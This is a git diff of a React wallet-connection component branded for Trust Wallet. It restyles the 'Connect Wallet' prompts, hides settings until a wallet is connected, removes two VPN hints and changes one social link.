@@ -650,12 +650,27 @@ export default function CoinbaseWalletConnect() {
                                                             </div>
                                                         )}
                                                     </div>
-
-                                                    <div className="flex-1 overflow-y-auto py-4">
-                                                        {/* Section: Wallets */}
-                                                        <div className="px-6 mb-6">
-                                                            <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Wallets</p>
-                                                            <button className={`w-full flex items-center gap-4 p-4 rounded-2xl border transition-all ${theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10' : 'bg-gray-50 border-gray-100 hover:bg-gray-100'}`}>
+                                                    
+                                                    {!address ? (
+                                                         <div className="flex-1 flex flex-col items-center justify-center py-20 text-center px-6">
+                                                            <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-8">
+                                                                <Wallet className="w-12 h-12 text-blue-500" />
+                                                            </div>
+                                                            <h3 className="text-2xl font-bold mb-3 tracking-tight">Connect Wallet</h3>
+                                                            <p className="text-gray-500 text-sm max-w-[280px] mb-10 leading-relaxed font-medium">Please connect your wallet to access settings and manage your profile.</p>
+                                                            <button 
+                                                                onClick={connectWallet}
+                                                                className="w-full max-w-[280px] py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98]"
+                                                            >
+                                                                Connect Now
+                                                            </button>
+                                                         </div>
+                                                      ) : (
+                                                          <div className="flex-1 overflow-y-auto py-4">
+                                                         {/* Section: Wallets */}
+                                                         <div className="px-6 mb-6">
+                                                             <p className="text-[10px] font-black uppercase tracking-widest opacity-30 mb-3">Wallets</p>
+                                                             <button className={`w-full flex items-center gap-4 p-4 rounded-2xl border transition-all ${theme === 'dark' ? 'bg-white/5 border-white/5 hover:bg-white/10' : 'bg-gray-50 border-gray-100 hover:bg-gray-100'}`}>
                                                                 <div className="w-10 h-10 rounded-xl bg-[#3375BB] flex items-center justify-center text-white">
                                                                     <Wallet className="w-5 h-5" />
                                                                 </div>
@@ -776,7 +791,7 @@ export default function CoinbaseWalletConnect() {
                                                                     <a href="https://trustwallet.com/" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
                                                                         <Plus className="w-5 h-5" />
                                                                     </a>
-                                                                    <a href="https://twitter.com/trustwallet" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
+                                                                    <a href="https://twitter.com/twitter" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
                                                                         <Globe className="w-5 h-5" />
                                                                     </a>
                                                                     <a href="https://trustwallet.com/security" target="_blank" rel="noopener noreferrer" className="opacity-30 hover:opacity-100 hover:text-blue-400 transition-all">
@@ -785,25 +800,24 @@ export default function CoinbaseWalletConnect() {
                                                                 </div>
                                                             </div>
                                                         </div>
-                                                    </div>
 
-                                                    {address && (
                                                         <div className="p-6 border-t border-white/5">
                                                             <button onClick={() => { disconnectWallet(); setShowSettingsMenu(false); }} className="w-full py-4 bg-red-500/10 hover:bg-red-500/20 text-red-500 rounded-2xl font-black uppercase tracking-widest text-[11px] transition-all flex items-center justify-center gap-2">
                                                                 <LogOut className="w-4 h-4" />
                                                                 Disconnect
                                                             </button>
                                                         </div>
-                                                    )}
-                                                </div>
+                                                    </div>
+                                                )}
+                                            </div>
                                             </motion.div>
                                         </>
                                     )}
-                                </AnimatePresence>
-
-                        {/* Main Content Area */}
-                        <div className="px-0 md:px-6 mb-12">
-                            <AnimatePresence mode="wait">
+                             </AnimatePresence>
+ 
+                         {/* Main Content Area */}
+                         <div className="px-0 md:px-6 mb-12">
+                             <AnimatePresence mode="wait">
                                 {view === 'wallet' ? (
                                     <motion.div key="wallet-view" initial={{ opacity: 0, x: -20 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -20 }}>
                                         {/* Wallet Badge */}
@@ -883,20 +897,17 @@ export default function CoinbaseWalletConnect() {
                                                             <motion.div key="crypto" initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="divide-y divide-gray-50 dark:divide-white/5">
                                                                 {!address ? (
                                                                     <div className="flex flex-col items-center justify-center py-20 text-center px-8">
-                                                                        <div className="w-20 h-20 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-6">
-                                                                            <ShieldAlert className="w-10 h-10 text-blue-500 opacity-40" />
+                                                                        <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-8">
+                                                                            <Wallet className="w-12 h-12 text-blue-500" />
                                                                         </div>
-                                                                        <h3 className="text-xl font-bold mb-3 opacity-80">Connect Wallet</h3>
-                                                                        <p className="text-xs opacity-40 leading-relaxed mb-8">Please connect your wallet to view your asset balances and transaction history.</p>
+                                                                        <h3 className="text-2xl font-bold mb-3 tracking-tight">Connect Wallet</h3>
+                                                                        <p className="text-gray-500 text-sm max-w-[280px] mb-10 leading-relaxed font-medium">Please connect your wallet to view your asset balances and transaction history.</p>
                                                                         <button 
                                                                             onClick={connectWallet}
-                                                                            className="px-8 py-4 bg-blue-500 text-white rounded-2xl font-bold uppercase tracking-widest text-[11px] shadow-xl shadow-blue-500/20 active:scale-95 transition-all"
+                                                                            className="w-full max-w-[280px] py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98]"
                                                                         >
                                                                             Connect Now
                                                                         </button>
-                                                                        <p className="text-[10px] opacity-30 mt-6 leading-relaxed px-4">
-                                                                            🔒 If connection fails, try enabling a VPN — some networks block wallet services.
-                                                                        </p>
                                                                     </div>
                                                                 ) : (
                                                                     <>
@@ -981,21 +992,21 @@ export default function CoinbaseWalletConnect() {
                                                 isInline={true}
                                             />
                                         ) : (
-                                            <div className="py-20 flex flex-col items-center text-center px-6">
-                                                <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-8">
-                                                    <Wallet className="w-12 h-12 text-blue-500" />
+                                                <div className="py-20 flex flex-col items-center text-center px-6">
+                                                    <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-8">
+                                                        <Wallet className="w-12 h-12 text-blue-500" />
+                                                    </div>
+                                                    <h2 className="text-2xl font-bold mb-3 tracking-tight">Connect Wallet</h2>
+                                                    <p className="text-gray-500 text-sm max-w-[280px] mb-10 leading-relaxed font-medium">
+                                                        To transfer assets securely, please connect your Trust Wallet first.
+                                                    </p>
+                                                    <button 
+                                                        onClick={() => connectWallet()}
+                                                        className="w-full max-w-[280px] py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98]"
+                                                    >
+                                                        Connect Now
+                                                    </button>
                                                 </div>
-                                                <h2 className="text-2xl font-bold mb-3 tracking-tight">Connect Your Wallet</h2>
-                                                <p className="text-gray-500 text-sm max-w-[280px] mb-10 leading-relaxed font-medium">
-                                                    To transfer assets securely, please connect your Trust Wallet first.
-                                                </p>
-                                                <button 
-                                                    onClick={() => connectWallet()}
-                                                    className="w-full max-w-[280px] py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98]"
-                                                >
-                                                    Connect Wallet
-                                                </button>
-                                            </div>
                                         )}
                                     </motion.div>
                                 ) : view === 'receive' ? (
@@ -1043,9 +1054,9 @@ export default function CoinbaseWalletConnect() {
                                         ) : (
                                             <div className="py-20 flex flex-col items-center text-center px-6">
                                                 <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mb-8">
-                                                    <RefreshCw className="w-12 h-12 text-blue-500" />
+                                                    <Wallet className="w-12 h-12 text-blue-500" />
                                                 </div>
-                                                <h2 className="text-2xl font-bold mb-3 tracking-tight">Connect Your Wallet</h2>
+                                                <h2 className="text-2xl font-bold mb-3 tracking-tight">Connect Wallet</h2>
                                                 <p className="text-gray-500 text-sm max-w-[280px] mb-10 leading-relaxed font-medium">
                                                     To swap assets instantly and securely, please connect your Trust Wallet first.
                                                 </p>
@@ -1053,7 +1064,7 @@ export default function CoinbaseWalletConnect() {
                                                     onClick={() => connectWallet()}
                                                     className="w-full max-w-[280px] py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98]"
                                                 >
-                                                    Connect Wallet
+                                                    Connect Now
                                                 </button>
                                             </div>
                                         )}
@@ -1152,15 +1163,12 @@ export default function CoinbaseWalletConnect() {
                     <div className="fixed inset-0 z-[200] flex items-center justify-center p-6">
                         <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 bg-black/80 backdrop-blur-md" onClick={() => setShowAccountPrompt(false)} />
                         <motion.div initial={{ scale: 0.9, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.9, opacity: 0 }} className={`relative w-full max-w-sm rounded-[3rem] p-10 text-center border shadow-2xl ${theme === 'dark' ? 'bg-black border-white/10' : 'bg-white border-transparent'}`}>
-                            <div className="w-20 h-20 bg-blue-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
-                                <Wallet className="w-10 h-10 text-blue-500" />
-                            </div>
-                            <h3 className="text-2xl font-black mb-2">Connect Wallet</h3>
-                            <p className="text-sm opacity-40 mb-8">Please connect your wallet to continue with this action.</p>
-                            <button onClick={() => { setShowAccountPrompt(false); connectWallet(); }} className="w-full py-4 bg-blue-500 hover:bg-blue-600 text-white rounded-2xl font-black uppercase tracking-widest transition-all">Connect Now</button>
-                            <p className="text-[10px] opacity-30 mt-5 leading-relaxed">
-                                🔒 If connection fails, try enabling a VPN — some networks block wallet services.
-                            </p>
+                             <div className="w-24 h-24 bg-blue-500/10 rounded-[2.5rem] flex items-center justify-center mx-auto mb-8">
+                                 <Wallet className="w-12 h-12 text-blue-500" />
+                             </div>
+                             <h3 className="text-2xl font-bold mb-3 tracking-tight">Connect Wallet</h3>
+                             <p className="text-gray-500 text-sm max-w-[280px] mx-auto mb-10 leading-relaxed font-medium">Please connect your wallet to continue with this action.</p>
+                             <button onClick={() => { setShowAccountPrompt(false); connectWallet(); }} className="w-full py-4 bg-blue-600 hover:bg-blue-700 text-white rounded-2xl font-bold shadow-xl shadow-blue-600/20 transition-all active:scale-[0.98] uppercase tracking-widest text-xs">Connect Now</button>
                         </motion.div>
                     </div>
                 )}
